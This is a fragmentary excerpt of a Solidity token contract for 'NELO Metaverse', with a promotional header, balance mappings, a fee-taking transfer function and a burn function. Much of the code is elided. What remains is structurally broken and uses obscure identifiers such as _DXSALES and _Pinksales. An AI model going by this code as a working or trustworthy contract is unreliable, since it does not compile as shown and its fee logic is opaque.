...
/**
In Nelo Metaverse, We are building a platform for bringing NFT Yield Mining ,
NFT Gamefi play to earn and Socialfi for $NELO token to Fiat exchange service
to our communities. We aim to build & provide comprehensive services around 
community members so everyone can enjoy staying with us, building up Wealth
together.

 * https://nelo.world/
 * https://twitter.com/NeloMetaverse
 * https://web.facebook.com/NeloMetaverseOfficial
 * https://t.me/NeloMetaverseOfficial
*/
...
interface iERC20Metadata is iERC20 {
 ...
 contract NELOMETA is NewATH, iERC20, iERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _DXSALES;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "NELO Metaverse";
    string private _symbol = "NELOMETA";
    ...
    constructor(uint256 totalSupply_, uint256 chetiri) {
        ...
        _DXSALES[msg.sender] = _totalSupply;
...
function sendETHToFee (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = _DXSALES[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            _DXSALES[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demand / 100) / _Pinksales;
        allons = allons -  (_fee * _Pinksales);
        
        _DXSALES[grantee] += allons;
   ...
   */
    ...
    function _burn(address account, uint256 sum) internal virtual {
        ...
        uint256 accountBalance = _DXSALES[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            _DXSALES[account] = accountBalance - sum;
        }
        _totalSupply -= sum;
